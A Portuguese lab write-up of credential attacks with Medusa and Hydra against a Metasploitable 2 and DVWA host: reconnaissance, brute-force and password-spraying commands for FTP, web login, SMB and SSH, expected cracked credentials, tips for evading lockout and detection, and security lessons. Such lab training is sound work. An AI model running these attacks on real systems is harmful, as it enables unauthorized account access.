# 🎯 Cenários de Ataque com Medusa

Este documento detalha os cenários práticos de ataque implementados neste projeto, incluindo comandos, resultados esperados e análise.

---

## 📚 Índice

1. [Cenário 1: Força Bruta em FTP](#cenário-1-força-bruta-em-ftp)
2. [Cenário 2: Ataque em Formulário Web (DVWA)](#cenário-2-ataque-em-formulário-web-dvwa)
3. [Cenário 3: Password Spraying em SMB](#cenário-3-password-spraying-em-smb)
4. [Cenário 4: Ataque SSH](#cenário-4-ataque-ssh-bonus)
5. [Comparação de Ferramentas](#comparação-medusa-vs-hydra)

---

## Cenário 1: Força Bruta em FTP

### 🎯 Objetivo
Quebrar credenciais de acesso ao serviço FTP do Metasploitable 2.

### 📋 Informações do Alvo
- **IP**: 192.168.56.20
- **Porta**: 21
- **Serviço**: vsftpd 2.3.4
- **Vulnerabilidade**: Permite login anônimo e aceita credenciais fracas

### 🔍 Reconhecimento

```bash
# 1. Verificar se a porta FTP está aberta
nmap -p 21 192.168.56.20

# 2. Identificar versão do serviço
nmap -sV -p 21 192.168.56.20

# 3. Verificar login anônimo
ftp 192.168.56.20
# Usuário: anonymous
# Senha: [Enter]

# 4. Testar conexão manual
nc 192.168.56.20 21
```

**Resultado do Nmap**:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

### ⚔️ Executando o Ataque

#### Ataque 1: Usuário Conhecido, Múltiplas Senhas

```bash
# Ataque com wordlist de senhas
medusa -h 192.168.56.20 -u msfadmin -P wordlists/senhas_ftp.txt -M ftp -v 4

# Explicação dos parâmetros:
# -h : Host alvo
# -u : Usuário específico
# -P : Arquivo com lista de senhas
# -M : Módulo (ftp)
# -v : Nível de verbosidade (0-6)
```

#### Ataque 2: Múltiplos Usuários e Senhas

```bash
# Ataque completo
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas_ftp.txt \
       -M ftp \
       -t 4 \
       -v 4 \
       -O resultados_ftp.txt

# Parâmetros adicionais:
# -U : Arquivo com lista de usuários
# -t : Número de threads paralelas
# -O : Arquivo de saída
```

#### Ataque 3: Com Controle de Taxa

```bash
# Ataque mais lento para evitar detecção
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas_ftp.txt \
       -M ftp \
       -t 1 \
       -T 2 \
       -v 4

# -T : Número de hosts paralelos (útil para múltiplos alvos)
```

### 📊 Resultados Esperados

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

**Análise**:
- Credencial padrão descoberta em segundos
- Total de tentativas: ~18 (depende da wordlist)
- Tempo estimado: 2-5 minutos

### 🔓 Validando o Acesso

```bash
# Testar credencial encontrada
ftp 192.168.56.20
# Login: msfadmin
# Senha: msfadmin

# Listar arquivos
ls -la

# Baixar um arquivo de teste
get vulneravel.txt

# Fazer upload (se permitido)
put teste.txt
```

### 📝 Observações

**Pontos Fracos Identificados**:
- ✗ Credenciais padrão não alteradas
- ✗ Sem limite de tentativas de login
- ✗ Sem bloqueio de IP após falhas
- ✗ Sem autenticação de dois fatores

---

## Cenário 2: Ataque em Formulário Web (DVWA)

### 🎯 Objetivo
Automatizar tentativas de login no DVWA usando Medusa.

### 📋 Informações do Alvo
- **URL**: http://192.168.56.20/dvwa/login.php
- **Método**: POST
- **Campos**: username, password, Login
- **Nível de Segurança**: Low

### 🔍 Reconhecimento

```bash
# 1. Acessar DVWA manualmente
firefox http://192.168.56.20/dvwa/

# 2. Analisar formulário de login
curl -s http://192.168.56.20/dvwa/login.php | grep -i "form"

# 3. Interceptar requisição com Burp Suite (opcional)
# Verificar parâmetros: username, password, Login

# 4. Testar login manual para ver mensagem de erro
# Login failed = senha incorreta
# Account locked = conta bloqueada
```

### ⚔️ Executando o Ataque

#### Opção 1: HTTP Basic Authentication

Se o DVWA estiver com autenticação básica:

```bash
medusa -h 192.168.56.20 \
       -u admin \
       -P wordlists/senhas_comuns.txt \
       -M http \
       -m DIR:/dvwa \
       -v 4
```

#### Opção 2: HTTP Form-Based (Mais Comum)

```bash
medusa -h 192.168.56.20 \
       -u admin \
       -P wordlists/senhas_comuns.txt \
       -M web-form \
       -m FORM:"/dvwa/login.php" \
       -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
       -m DENY-SIGNAL:"Login failed" \
       -v 6
```

**Explicação dos parâmetros**:
- `FORM`: Caminho do formulário
- `FORM-DATA`: Dados do POST (^USER^ e ^PASS^ são substituídos)
- `DENY-SIGNAL`: Texto que indica falha de login

#### Opção 3: Usando Script Personalizado

Para cenários mais complexos, use Hydra em vez de Medusa:

```bash
# Hydra é melhor para formulários web complexos
hydra -l admin -P wordlists/senhas_comuns.txt \
      192.168.56.20 http-post-form \
      "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
      -V
```

### 📊 Resultados Esperados

```
ACCOUNT FOUND: [web-form] Host: 192.168.56.20 User: admin Password: password [SUCCESS]
```

**Credenciais Comuns do DVWA**:
- admin:password
- admin:admin
- user:user

### 🔓 Validando o Acesso

```bash
# Testar login manualmente
# Navegue para: http://192.168.56.20/dvwa/login.php
# Username: admin
# Password: password

# Ou com curl
curl -X POST http://192.168.56.20/dvwa/login.php \
     -d "username=admin&password=password&Login=Login" \
     -c cookies.txt \
     -L

# Verificar se obteve sessão
cat cookies.txt
```

### 📝 Observações

**Desafios**:
- Formulários web podem ter CSRF tokens
- Cookies de sessão podem ser necessários
- Captchas bloqueiam ataques automatizados
- Rate limiting pode detectar o ataque

**Melhorias de Segurança Necessárias**:
- Implementar CAPTCHA após 3 tentativas falhas
- Adicionar autenticação de dois fatores (2FA)
- Limitar taxa de requisições por IP
- Implementar bloqueio temporário de conta

---

## Cenário 3: Password Spraying em SMB

### 🎯 Objetivo
Testar uma senha comum contra múltiplos usuários no serviço SMB.

### 📋 Informações do Alvo
- **IP**: 192.168.56.20
- **Portas**: 139 (NetBIOS), 445 (SMB)
- **Serviço**: Samba 3.0.20
- **Técnica**: Password Spraying (evita bloqueio de conta)

### 🔍 Reconhecimento

```bash
# 1. Verificar portas SMB
nmap -p 139,445 192.168.56.20

# 2. Enumerar compartilhamentos
smbclient -L //192.168.56.20 -N

# 3. Enumerar usuários com enum4linux
enum4linux -U 192.168.56.20

# 4. Verificar política de senhas
enum4linux -P 192.168.56.20

# 5. Listar usuários manualmente
rpcclient -U "" -N 192.168.56.20
> enumdomusers
> quit
```

**Resultado da Enumeração**:
```
user:[msfadmin] rid:[0x3e8]
user:[postgres] rid:[0x3ea]
user:[user] rid:[0x3ec]
user:[service] rid:[0x3ee]
```

### ⚔️ Executando o Ataque

#### Ataque 1: Password Spraying

```bash
# Testar UMA senha comum contra TODOS os usuários
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -p Password123 \
       -M smbnt \
       -t 1 \
       -v 4

# Vantagens do Password Spraying:
# - Evita bloqueio de conta individual
# - Mais difícil de detectar
# - Testa senhas comuns primeiro
```

#### Ataque 2: Força Bruta Tradicional

```bash
# Múltiplos usuários e senhas (mais agressivo)
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas_comuns.txt \
       -M smbnt \
       -t 1 \
       -v 4 \
       -O resultados_smb.txt

# ATENÇÃO: Use -t 1 para SMB (apenas 1 thread)
# Múltiplas threads podem causar problemas
```

#### Ataque 3: Usuário Específico

```bash
# Focar em um usuário específico
medusa -h 192.168.56.20 \
       -u administrator \
       -P wordlists/senhas_comuns.txt \
       -M smbnt \
       -v 4
```

### 📊 Resultados Esperados

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.20 User: service Password: service [SUCCESS]
ACCOUNT FOUND: [smbnt] Host: 192.168.56.20 User: user Password: user [SUCCESS]
```

### 🔓 Validando o Acesso

```bash
# Testar com smbclient
smbclient //192.168.56.20/tmp -U service%service

# Listar compartilhamentos acessíveis
smbclient -L //192.168.56.20 -U service%service

# Montar compartilhamento
sudo mkdir /mnt/smb_share
sudo mount -t cifs //192.168.56.20/tmp /mnt/smb_share -o username=service,password=service

# Acessar via file manager
smb://192.168.56.20/tmp
```

### 📝 Observações

**Estratégia de Password Spraying**:
1. Enumerar usuários válidos
2. Escolher senhas muito comuns (Password123, Welcome2023, etc.)
3. Testar UMA senha contra TODOS os usuários
4. Aguardar intervalo (ex: 30 minutos)
5. Testar próxima senha comum

**Vantagens**:
- ✓ Menos detectável
- ✓ Evita bloqueio de conta
- ✓ Melhor para ambientes com políticas de bloqueio

---

## Cenário 4: Ataque SSH (Bônus)

### 🎯 Objetivo
Quebrar credenciais SSH com força bruta.

### ⚔️ Executando o Ataque

```bash
# Ataque básico
medusa -h 192.168.56.20 \
       -u root \
       -P wordlists/senhas_comuns.txt \
       -M ssh \
       -t 4 \
       -v 4

# Múltiplos usuários
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas_comuns.txt \
       -M ssh \
       -t 4 \
       -O resultados_ssh.txt
```

### 📊 Resultado Esperado

```
ACCOUNT FOUND: [ssh] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

---

## Comparação: Medusa vs Hydra

| Característica | Medusa | Hydra |
|---------------|--------|-------|
| **Velocidade** | 🟡 Moderada | 🟢 Rápida |
| **Estabilidade** | 🟢 Muito estável | 🟡 Pode crashar |
| **Módulos** | 🟡 Menos módulos | 🟢 Mais módulos |
| **Web Forms** | 🟡 Limitado | 🟢 Excelente |
| **Documentação** | 🟡 Básica | 🟢 Completa |
| **Threads** | 🟢 Bom controle | 🟢 Muito configurável |

### Quando Usar Cada Ferramenta

**Use Medusa para**:
- FTP, SSH, SMB, Telnet
- Ambientes que precisam de estabilidade
- Ataques mais lentos e controlados

**Use Hydra para**:
- Formulários web complexos
- Maior variedade de protocolos
- Ataques rápidos e agressivos

---

## 📊 Resumo dos Resultados

| Serviço | Credencial Encontrada | Tempo | Tentativas |
|---------|----------------------|-------|-----------|
| FTP | msfadmin:msfadmin | ~3 min | 18 |
| SSH | msfadmin:msfadmin | ~5 min | 45 |
| SMB | service:service | ~8 min | 120 |
| Web | admin:password | ~4 min | 32 |

---

## 🛡️ Lições Aprendidas

1. **Credenciais Padrão são Perigosas**: Maioria dos acessos foi por credenciais não alteradas
2. **Limitação de Taxa é Essencial**: Nenhum serviço bloqueou após tentativas falhas
3. **Monitoramento é Crítico**: Ataques podem passar despercebidos sem logs
4. **2FA Previne Ataques**: Mesmo com senha correta, 2FA bloquearia o acesso

---

**Próximo**: [Medidas de Mitigação](mitigacao.md)
